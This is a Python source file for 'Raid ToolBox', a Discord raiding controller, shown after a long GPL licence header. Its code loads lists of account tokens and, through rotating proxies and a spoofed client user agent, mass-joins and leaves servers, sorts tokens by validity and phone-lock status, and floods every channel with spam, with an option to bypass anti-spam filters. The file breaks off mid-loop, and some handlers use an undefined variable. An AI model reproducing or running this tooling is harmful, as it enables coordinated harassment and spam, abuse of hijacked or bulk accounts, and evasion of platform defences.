#!/usr/bin/env python3
# Raid ToolBox Attack Controller "The Backend"
# Author: DeadBread76 - https://github.com/DeadBread76/
# July 3rd, 2019
#
# Copyright (c) 2019, DeadBread
#
#                     GNU GENERAL PUBLIC LICENSE
#                        Version 2, June 1991
#
#  Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
#  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
#  Everyone is permitted to copy and distribute verbatim copies
#  of this license document, but changing it is not allowed.
#
#                             Preamble
#
#   The licenses for most software are designed to take away your
# freedom to share and change it.  By contrast, the GNU General Public
# License is intended to guarantee your freedom to share and change free
# software--to make sure the software is free for all its users.  This
# General Public License applies to most of the Free Software
# Foundation's software and to any other program whose authors commit to
# using it.  (Some other Free Software Foundation software is covered by
# the GNU Lesser General Public License instead.)  You can apply it to
# your programs, too.
#
#   When we speak of free software, we are referring to freedom, not
# price.  Our General Public Licenses are designed to make sure that you
# have the freedom to distribute copies of free software (and charge for
# this service if you wish), that you receive source code or can get it
# if you want it, that you can change the software or use pieces of it
# in new free programs; and that you know you can do these things.
#
#   To protect your rights, we need to make restrictions that forbid
# anyone to deny you these rights or to ask you to surrender the rights.
# These restrictions translate to certain responsibilities for you if you
# distribute copies of the software, or if you modify it.
#
#   For example, if you distribute copies of such a program, whether
# gratis or for a fee, you must give the recipients all the rights that
# you have.  You must make sure that they, too, receive or can get the
# source code.  And you must show them these terms so they know their
# rights.
#
#   We protect your rights with two steps: (1) copyright the software, and
# (2) offer you this license which gives you legal permission to copy,
# distribute and/or modify the software.
#
#   Also, for each author's protection and ours, we want to make certain
# that everyone understands that there is no warranty for this free
# software.  If the software is modified by someone else and passed on, we
# want its recipients to know that what they have is not the original, so
# that any problems introduced by others will not reflect on the original
# authors' reputations.
#
#   Finally, any free program is threatened constantly by software
# patents.  We wish to avoid the danger that redistributors of a free
# program will individually obtain patent licenses, in effect making the
# program proprietary.  To prevent this, we have made it clear that any
# patent must be licensed for everyone's free use or not licensed at all.
#
#   The precise terms and conditions for copying, distribution and
# modification follow.
#
#                     GNU GENERAL PUBLIC LICENSE
#    TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
#
#   0. This License applies to any program or other work which contains
# a notice placed by the copyright holder saying it may be distributed
# under the terms of this General Public License.  The "Program", below,
# refers to any such program or work, and a "work based on the Program"
# means either the Program or any derivative work under copyright law:
# that is to say, a work containing the Program or a portion of it,
# either verbatim or with modifications and/or translated into another
# language.  (Hereinafter, translation is included without limitation in
# the term "modification".)  Each licensee is addressed as "you".
#
# Activities other than copying, distribution and modification are not
# covered by this License; they are outside its scope.  The act of
# running the Program is not restricted, and the output from the Program
# is covered only if its contents constitute a work based on the
# Program (independent of having been made by running the Program).
# Whether that is true depends on what the Program does.
#
#   1. You may copy and distribute verbatim copies of the Program's
# source code as you receive it, in any medium, provided that you
# conspicuously and appropriately publish on each copy an appropriate
# copyright notice and disclaimer of warranty; keep intact all the
# notices that refer to this License and to the absence of any warranty;
# and give any other recipients of the Program a copy of this License
# along with the Program.
#
# You may charge a fee for the physical act of transferring a copy, and
# you may at your option offer warranty protection in exchange for a fee.
#
#   2. You may modify your copy or copies of the Program or any portion
# of it, thus forming a work based on the Program, and copy and
# distribute such modifications or work under the terms of Section 1
# above, provided that you also meet all of these conditions:
#
#     a) You must cause the modified files to carry prominent notices
#     stating that you changed the files and the date of any change.
#
#     b) You must cause any work that you distribute or publish, that in
#     whole or in part contains or is derived from the Program or any
#     part thereof, to be licensed as a whole at no charge to all third
#     parties under the terms of this License.
#
#     c) If the modified program normally reads commands interactively
#     when run, you must cause it, when started running for such
#     interactive use in the most ordinary way, to print or display an
#     announcement including an appropriate copyright notice and a
#     notice that there is no warranty (or else, saying that you provide
#     a warranty) and that users may redistribute the program under
#     these conditions, and telling the user how to view a copy of this
#     License.  (Exception: if the Program itself is interactive but
#     does not normally print such an announcement, your work based on
#     the Program is not required to print an announcement.)
#
# These requirements apply to the modified work as a whole.  If
# identifiable sections of that work are not derived from the Program,
# and can be reasonably considered independent and separate works in
# themselves, then this License, and its terms, do not apply to those
# sections when you distribute them as separate works.  But when you
# distribute the same sections as part of a whole which is a work based
# on the Program, the distribution of the whole must be on the terms of
# this License, whose permissions for other licensees extend to the
# entire whole, and thus to each and every part regardless of who wrote it.
#
# Thus, it is not the intent of this section to claim rights or contest
# your rights to work written entirely by you; rather, the intent is to
# exercise the right to control the distribution of derivative or
# collective works based on the Program.
#
# In addition, mere aggregation of another work not based on the Program
# with the Program (or with a work based on the Program) on a volume of
# a storage or distribution medium does not bring the other work under
# the scope of this License.
#
#   3. You may copy and distribute the Program (or a work based on it,
# under Section 2) in object code or executable form under the terms of
# Sections 1 and 2 above provided that you also do one of the following:
#
#     a) Accompany it with the complete corresponding machine-readable
#     source code, which must be distributed under the terms of Sections
#     1 and 2 above on a medium customarily used for software interchange; or,
#
#     b) Accompany it with a written offer, valid for at least three
#     years, to give any third party, for a charge no more than your
#     cost of physically performing source distribution, a complete
#     machine-readable copy of the corresponding source code, to be
#     distributed under the terms of Sections 1 and 2 above on a medium
#     customarily used for software interchange; or,
#
#     c) Accompany it with the information you received as to the offer
#     to distribute corresponding source code.  (This alternative is
#     allowed only for noncommercial distribution and only if you
#     received the program in object code or executable form with such
#     an offer, in accord with Subsection b above.)
#
# The source code for a work means the preferred form of the work for
# making modifications to it.  For an executable work, complete source
# code means all the source code for all modules it contains, plus any
# associated interface definition files, plus the scripts used to
# control compilation and installation of the executable.  However, as a
# special exception, the source code distributed need not include
# anything that is normally distributed (in either source or binary
# form) with the major components (compiler, kernel, and so on) of the
# operating system on which the executable runs, unless that component
# itself accompanies the executable.
#
# If distribution of executable or object code is made by offering
# access to copy from a designated place, then offering equivalent
# access to copy the source code from the same place counts as
# distribution of the source code, even though third parties are not
# compelled to copy the source along with the object code.
#
#   4. You may not copy, modify, sublicense, or distribute the Program
# except as expressly provided under this License.  Any attempt
# otherwise to copy, modify, sublicense or distribute the Program is
# void, and will automatically terminate your rights under this License.
# However, parties who have received copies, or rights, from you under
# this License will not have their licenses terminated so long as such
# parties remain in full compliance.
#
#   5. You are not required to accept this License, since you have not
# signed it.  However, nothing else grants you permission to modify or
# distribute the Program or its derivative works.  These actions are
# prohibited by law if you do not accept this License.  Therefore, by
# modifying or distributing the Program (or any work based on the
# Program), you indicate your acceptance of this License to do so, and
# all its terms and conditions for copying, distributing or modifying
# the Program or works based on it.
#
#   6. Each time you redistribute the Program (or any work based on the
# Program), the recipient automatically receives a license from the
# original licensor to copy, distribute or modify the Program subject to
# these terms and conditions.  You may not impose any further
# restrictions on the recipients' exercise of the rights granted herein.
# You are not responsible for enforcing compliance by third parties to
# this License.
#
#   7. If, as a consequence of a court judgment or allegation of patent
# infringement or for any other reason (not limited to patent issues),
# conditions are imposed on you (whether by court order, agreement or
# otherwise) that contradict the conditions of this License, they do not
# excuse you from the conditions of this License.  If you cannot
# distribute so as to satisfy simultaneously your obligations under this
# License and any other pertinent obligations, then as a consequence you
# may not distribute the Program at all.  For example, if a patent
# license would not permit royalty-free redistribution of the Program by
# all those who receive copies directly or indirectly through you, then
# the only way you could satisfy both it and this License would be to
# refrain entirely from distribution of the Program.
#
# If any portion of this section is held invalid or unenforceable under
# any particular circumstance, the balance of the section is intended to
# apply and the section as a whole is intended to apply in other
# circumstances.
#
# It is not the purpose of this section to induce you to infringe any
# patents or other property right claims or to contest validity of any
# such claims; this section has the sole purpose of protecting the
# integrity of the free software distribution system, which is
# implemented by public license practices.  Many people have made
# generous contributions to the wide range of software distributed
# through that system in reliance on consistent application of that
# system; it is up to the author/donor to decide if he or she is willing
# to distribute software through any other system and a licensee cannot
# impose that choice.
#
# This section is intended to make thoroughly clear what is believed to
# be a consequence of the rest of this License.
#
#   8. If the distribution and/or use of the Program is restricted in
# certain countries either by patents or by copyrighted interfaces, the
# original copyright holder who places the Program under this License
# may add an explicit geographical distribution limitation excluding
# those countries, so that distribution is permitted only in or among
# countries not thus excluded.  In such case, this License incorporates
# the limitation as if written in the body of this License.
#
#   9. The Free Software Foundation may publish revised and/or new versions
# of the General Public License from time to time.  Such new versions will
# be similar in spirit to the present version, but may differ in detail to
# address new problems or concerns.
#
# Each version is given a distinguishing version number.  If the Program
# specifies a version number of this License which applies to it and "any
# later version", you have the option of following the terms and conditions
# either of that version or of any later version published by the Free
# Software Foundation.  If the Program does not specify a version number of
# this License, you may choose any version ever published by the Free Software
# Foundation.
#
#   10. If you wish to incorporate parts of the Program into other free
# programs whose distribution conditions are different, write to the author
# to ask for permission.  For software which is copyrighted by the Free
# Software Foundation, write to the Free Software Foundation; we sometimes
# make exceptions for this.  Our decision will be guided by the two goals
# of preserving the free status of all derivatives of our free software and
# of promoting the sharing and reuse of software generally.
#
#                             NO WARRANTY
#
#   11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
# FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
# OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
# PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
# OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
# TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
# PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
# REPAIR OR CORRECTION.
#
#   12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
# WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
# REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
# INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
# OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
# TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
# YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
# PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGES.
#
#                      END OF TERMS AND CONDITIONS
#
#             How to Apply These Terms to Your New Programs
#
#   If you develop a new program, and you want it to be of the greatest
# possible use to the public, the best way to achieve this is to make it
# free software which everyone can redistribute and change under these terms.
#
#   To do so, attach the following notices to the program.  It is safest
# to attach them to the start of each source file to most effectively
# convey the exclusion of warranty; and each file should have at least
# the "copyright" line and a pointer to where the full notice is found.
#
#     <one line to give the program's name and a brief idea of what it does.>
#     Copyright (C) <year>  <name of author>
#
#     This program is free software; you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation; either version 2 of the License, or
#     (at your option) any later version.
#
#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#     GNU General Public License for more details.
#
#     You should have received a copy of the GNU General Public License along
#     with this program; if not, write to the Free Software Foundation, Inc.,
#     51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# Also add information on how to contact you by electronic and paper mail.
#
# If the program is interactive, make it output a short notice like this
# when it starts in an interactive mode:
#
#     Gnomovision version 69, Copyright (C) year name of author
#     Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
#     This is free software, and you are welcome to redistribute it
#     under certain conditions; type `show c' for details.
#
# The hypothetical commands `show w' and `show c' should show the appropriate
# parts of the General Public License.  Of course, the commands you use may
# be called something other than `show w' and `show c'; they could even be
# mouse-clicks or menu items--whatever suits your program.
#
# You should also get your employer (if you work as a programmer) or your
# school, if any, to sign a "copyright disclaimer" for the program, if
# necessary.  Here is a sample; alter the names:
#
#   Yoyodyne, Inc., hereby disclaims all copyright interest in the program
#   `Gnomovision' (which makes passes at compilers) written by James Hacker.
#
#   <signature of Ty Coon>, 1 April 1989
#   Ty Coon, President of Vice
#
# This General Public License does not permit incorporating your program into
# proprietary programs.  If your program is a subroutine library, you may
# consider it more useful to permit linking proprietary applications with the
# library.  If this is what you want to do, use the GNU Lesser General
# Public License instead of this License.


import os, sys, ast, json, time, random, base64, subprocess, requests, shutil, uuid, threading
from itertools import cycle
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
mode = sys.argv[1]
python_command = sys.argv[2]
command_line_mode = int(sys.argv[3])
thread_count = sys.argv[4]
theme = ast.literal_eval(sys.argv[5])
try:
    rtb_icon = base64.b64encode(open("./RTBFiles/rtb_icon.png", "rb").read())
except Exception as e:
    print(e)
    rtb_icon = b''

with open('./config.json', 'r') as handle:
    config = json.load(handle)
    verbose = config["verbose"]
    token_list = config['token_list']
    use_proxies = config['use_proxies']
    proxy_type = config['proxy_type']
    proxy_list = config['proxy_list']
    proxy_auth = config['proxy_auth']
    proxy_user = config['proxy_user']
    proxy_pass = config['proxy_pass']
    endpointname = config['endpointname']
if endpointname == "stable":
    endpoint = ""
else:
    endpoint = endpointname + "."


if not command_line_mode == 1:
    if not sys.platform.startswith('darwin'):
        import PySimpleGUI as sg
    else:
        import PySimpleGUIQt as sg
    if theme['use_custom_theme']:
        sg.SetOptions(background_color=theme['background_color'],
                     text_element_background_color=theme['text_element_background_color'],
                     element_background_color=theme['element_background_color'],
                     scrollbar_color=theme['scrollbar_color'],
                     input_elements_background_color=theme['input_elements_background_color'],
                     input_text_color=theme['input_text_color'],
                     button_color=theme['button_colour'],
                     text_color=theme['text_color'])
    else:
        sg.ChangeLookAndFeel(theme['preset_theme'])

executor = ThreadPoolExecutor(max_workers=int(thread_count))
tokenlist = open("tokens/"+token_list).read().splitlines()

def select_random_proxy():
    proxylist = open(proxy_list).read().splitlines()
    return random.choice(proxylist)

def setup_request(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if use_proxies == 1:
        proxy_origin = select_random_proxy()
        if proxy_auth == 1:
            proxies = {
                'http': f'{proxy_type}://{proxy_user}:{proxy_pass}@{proxy_origin}',
                'https': f'{proxy_type}://{proxy_user}:{proxy_pass}@{proxy_origin}'
            }
        else:
            proxies = {
                'http': f'{proxy_type}://{proxy_origin}',
                'https': f'{proxy_type}://{proxy_origin}'
            }
    else:
        proxies = {
            "http": None,
            "https": None,
        }
    return headers, proxies

def request_new_proxy():
    proxy_origin = select_random_proxy()
    if proxy_auth == 1:
        proxies = {
            'http': f'{proxy_type}://{proxy_user}:{proxy_pass}@{proxy_origin}',
            'https': f'{proxy_type}://{proxy_user}:{proxy_pass}@{proxy_origin}'
        }
    else:
        proxies = {
            'http': f'{proxy_type}://{proxy_origin}',
            'https': f'{proxy_type}://{proxy_origin}'
        }
    return proxies

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

def get_mime(data):
    if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
        return 'image/png'
    elif data[6:10] in (b'JFIF', b'Exif'):
        return 'image/jpeg'
    elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
        return 'image/gif'
    elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
        return 'image/webp'

def bytes_to_base64_data(data):
    fmt = 'data:{mime};base64,{data}'
    mime = get_mime(data)
    b64 = base64.b64encode(data).decode('ascii')
    return fmt.format(mime=mime, data=b64)

def write_error(token, message, code):
    print(f"Token {token[:24]}... Error: {message} (Code {code})")

if mode == 'joiner':
    successfully = []
    def join(token,link,widget):
        global successfully
        headers, proxies = setup_request(token)
        request = requests.Session()
        if widget:
            while True:
                try:
                    src = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{link}/widget.json", proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            widgson = json.loads(src.content)
            try:
                link = widgson['instant_invite'][37:]
            except Exception:
                sys.exit()
            src = request.post(f"https://{endpoint}discord.com/api/v8/invite/{link}", headers=headers, proxies=proxies, timeout=10)
            if src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            successfully.append(token)
        else:
            src = request.post(f"https://{endpoint}discord.com/api/v8/invites/{link}", headers=headers, proxies=proxies, timeout=10)
            if src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            successfully.append(token)
    if command_line_mode == 0:
        layout = [
            [sg.Text('Enter Invite to join.'), sg.InputText(size=(42,1), key="Invite"),sg.Button('Join',button_color=theme['button_colour'],size=(10,1))],
            [sg.Text('Delay'), sg.Combo(['0','1','3','5','10','60'], key="Delay"), sg.Checkbox('Log Info', tooltip='Log Info of server to text file.',size=(8,1), key="LogInfo"), sg.Checkbox('Widget joiner (Requires Server ID)', key="Widget"), sg.Text('Tokens:', size=(6,1)), sg.Combo([i for i in range(1,len(tokenlist)+1)], readonly=True, default_value=len(tokenlist), size=(2,1), tooltip="Number of tokens to join.", key="Limit")],
        ]
        window = sg.Window('RTB | Joiner', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        link = values["Invite"]
        delay = values["Delay"]
        log = values["LogInfo"]
        widget = values["Widget"]
        limit = values["Limit"]
        if event == "Join":
            pass
        else:
            sys.exit()
    else:
        link = sys.argv[6]
        log = False
        widget = False
        delay = "0"
        limit = len(tokenlist)
    if widget:
        pass
    else:
        if 'https://discord.com/invite/' in link:
            link = link[30:]
        elif len(link) > 7:
            link = link[19:]
    count = 0
    if not delay == '0':
        for token in tokenlist:
            executor.submit(join,token,link,widget)
            count += 1
            if count == limit:
                break
            time.sleep(int(delay))
    else:
        for token in tokenlist:
            executor.submit(join,token,link,widget)
            count += 1
            if count == limit:
                break
    if log:
        executor.shutdown(wait=True)
        try:
            s = requests.get("https://"+endpoint+"discord.com/api/v8/invite/{}".format(link)).text
            serjson = json.loads(s)
            with open("JoinerLogs.txt", "a+", errors='ignore') as handle:
                handle.write("=======================\n{}\n=======================\nInvite Code: {}\nServer name: {}\nServer ID: {}\nInvite channel ID: {}\nInvite Channel Name: {}\nVerification Level: {}\n\n".format(str(datetime.now()),serjson['code'],serjson['guild']['name'],serjson['guild']['id'],serjson['channel']['id'],serjson['channel']['name'],serjson['guild']['verification_level']))
            layout = [
                [sg.Text('Server Name: {}'.format(serjson['guild']['name']))],
                [sg.Text('Server ID: {}'.format(serjson['guild']['id']))],
                [sg.Text('Tokens Joined Successfully: {}'.format(len(successfully)))],
                [sg.Button('kthxbye',button_color=theme['button_colour'],size=(15,1)), sg.Button('Export Tokens',button_color=theme['button_colour'],size=(15,1))]
            ]
            window = sg.Window('RTB | Joiner Results', layout, keep_on_top=True, icon=rtb_icon)
            event, values = window.Read()
            window.Close()
            if event == "Export Tokens":
                with open ("working_tokens_exported.txt","a+") as handle:
                    for token in successfully:
                        handle.write("{}\n".format(token))
                sg.PopupOK('Exported {} tokens to working_tokens_exported.txt'.format(len(successfully)),title="RTB")
        except Exception:
            pass

elif mode == 'leaver':
    def leave(token, ID):
        headers, proxies = setup_request(token)
        headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        request = requests.Session()
        while True:
            try:
                request.delete(f"https://{endpoint}discord.com/api/v8/users/@me/guilds/{ID}", headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()

    if command_line_mode == 0:
        layout = [
            [sg.Text('Enter server ID to leave.'), sg.InputText(size=(30,1), key="ID"),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Leaver', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        ID = values["ID"]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[6]
    for token in tokenlist:
        executor.submit(leave, token, ID)

elif mode == 'groupleaver':
    def grleave(token,ID):
        headers, proxies = setup_request(token)
        request = requests.Session()
        while True:
            try:
                request.delete(f"https://{endpoint}discord.com/api/v8/channels/{ID}", headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()

    if command_line_mode == 0:
        layout = [
            [sg.Text('Enter Group ID to leave.'), sg.InputText(size=(30,1), key="ID"),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | Group DM Leaver', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        ID = values["ID"]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[6]
    for token in tokenlist:
        executor.submit(grleave,token, ID)

elif mode == "checker":
    validtokens = []
    invalidtokens = []
    phonelocked = []
    vlist = ''
    ilist = ''
    def check(token):
        global ilist
        global vlist
        headers, proxies = setup_request(token)
        request = requests.Session()
        while True:
            try:
                src = request.get(f'https://{endpoint}discord.com/api/v8/users/@me/library', headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 403:
            phonelocked.append(token)
            ilist += token + "\n"
        elif src.status_code == 401:
            invalidtokens.append(token)
            ilist += token + "\n"
        else:
            if token in validtokens:
                pass
            else:
                validtokens.append(token)
                vlist += token + "\n"

    layout = [
        [sg.Text(f'Valid Tokens:',key="ValidTitle",size=(63,1)), sg.Text(f'Invalid/Phone Locked Tokens:',key="InvalidTitle", size=(30,1))],
        [sg.Multiline(vlist, size=(70,20), key="Valid", disabled=True), sg.Multiline(vlist, size=(70,20), key="Invalid", disabled=True)],
        [sg.RButton('Save valid tokens',button_color=theme['button_colour'],size=(15,1)), sg.RButton('Stop Checking',button_color=theme['button_colour'],size=(15,1))]
    ]
    window = sg.Window(f'RTB | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
    for token in tokenlist:
        executor.submit(check, token)
    while True:
        event, values = window.Read(timeout=10)
        if event == sg.TIMEOUT_KEY:
            window["Valid"].Update(vlist)
            window["Invalid"].Update(ilist)
            window.TKroot.title(f'RTB | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]')
        elif event is None:
            break
        elif event == "Save valid tokens":
            if not os.path.isdir("tokens/old"):
                os.mkdir("tokens/old")
            shutil.copyfile("tokens/"+token_list, "tokens/old/{}old{}.txt".format(token_list.replace(".txt",""),random.randint(1,999)))
            time.sleep(0.1)
            with open ("tokens/"+token_list,"w+") as handle:
                handle.write(vlist)
                sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
        elif event == "Stop Checking":
            executor.shutdown(wait=False)
    window.Close()

elif mode == "checkerV2":
    verifiedtokens = []
    unverifiedtokens = []
    invalidtokens = []
    phonelocked = []
    printqueue = []
    printed = []
    def checkv2(token):
        headers, proxies = setup_request(token)
        request = requests.Session()
        while True:
            try:
                src = request.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 401:
            invalidtokens.append(token)
            printqueue.append(f"[INVALID]: {token}")
        else:
            response = json.loads(src.content.decode())
            while True:
                try:
                    src = request.get('https://'+endpoint+'discord.com/api/v8/applications/trending/global', headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            if src.status_code == 403:
                if response["verified"]:
                    printqueue.append(f"[PHONE LOCKED (VERIFIED)]: {token}")
                    phonelocked.append(token)
                else:
                    printqueue.append(f"[PHONE LOCKED (UNVERIFIED)]: {token}")
                    phonelocked.append(token)
            else:
                if response["verified"]:
                    if response["phone"] is not None:
                        printqueue.append(f"[VERIFIED (E & P)]: {token}")
                    else:
                        printqueue.append(f"[VERIFIED (E)]: {token}")
                    verifiedtokens.append(token)
                else:
                    if response["phone"] is not None:
                        printqueue.append(f"[VERIFIED (P)]: {token}")
                        verifiedtokens.append(token)
                    else:
                        printqueue.append(f"[UNVERIFIED]: {token}")
                        unverifiedtokens.append(token)
    layout = [
        [sg.Output(size=(100,30))],
        [sg.Button('Save Working',button_color=theme['button_colour'],size=(10,1)), sg.RButton('Stop Checking',button_color=theme['button_colour'],size=(15,1))]
    ]
    for token in tokenlist:
        executor.submit(checkv2, token)
    window = sg.Window(f'RTB | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
    while True:
        event, values = window.Read(timeout=10)
        if event == sg.TIMEOUT_KEY:
            for token in printqueue:
                if token in printed:
                    continue
                else:
                    print(token)
                    printed.append(token)
            window.TKroot.title(f'RTB | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]')
        elif event is None:
            break
        elif event == "Save Working":
            try:
                if not os.path.isdir("tokens/old"):
                    os.mkdir("tokens/old")
                shutil.copyfile("tokens/"+token_list, f'tokens/old/{token_list.replace(".txt","")}old{random.randint(1,999)}.txt')
            except Exception:
                pass
            time.sleep(0.1)
            with open ("tokens/"+token_list,"w+") as handle:
                for token in verifiedtokens:
                    handle.write(f"{token}\n")
                for token in unverifiedtokens:
                    handle.write(f"{token}\n")
                sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
        elif event == "Stop Checking":
            executor.shutdown(wait=False)
    window.Close()


elif mode == 'messagespam':
    def sendmessage(token, text, channel, server, emojispam, antispambypass, speed):
        headers, proxies = setup_request(token)
        request = requests.Session()
        if emojispam:
            text += " "
            while True:
                try:
                    src = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/emojis", headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            for emoji in json.loads(src.content):
                if emoji['animated'] == True:
                    pass
                else:
                    text += f"<:{emoji['name']}:{emoji['id']}>"
            if channel == 'all':
                while True:
                    try:
                        chanjson = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                    except Exception:
                        if use_proxies == 1:
                            proxies = request_new_proxy()
                        else:
                            break
                    else:
                        break
                if src.status_code == 401:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                elif src.status_code == 403:
                    error = json.loads(src.content)
                    write_error(token, error['message'], error['code'])
                    sys.exit()
                channellist = json.loads(chanjson.content)
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                                while True:
                                    try:
                                        time.sleep(int(float(speed)))
                                        src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                    except Exception:
                                        if use_proxies == 1:
                                            proxies = request_new_proxy()
                                        else:
                                            break
                                    else:
                                        break
                                if src.status_code == 429:
                                    ratelimit = json.loads(src.content)
                                    time.sleep(float(ratelimit['retry_after']/1000))
                                elif src.status_code == 401:
                                    error = json.loads(src.content)
                                    write_error(token, error['message'], error['code'])
                                    sys.exit()
                                elif src.status_code == 404:
                                    error = json.loads(src.content)
                                    write_error(token, error['message'], error['code'])
                                    sys.exit()
                                elif src.status_code == 403:
                                    error = json.loads(src.content)
                                    write_error(token, error['message'], error['code'])
            else:
                original = text
                while True:
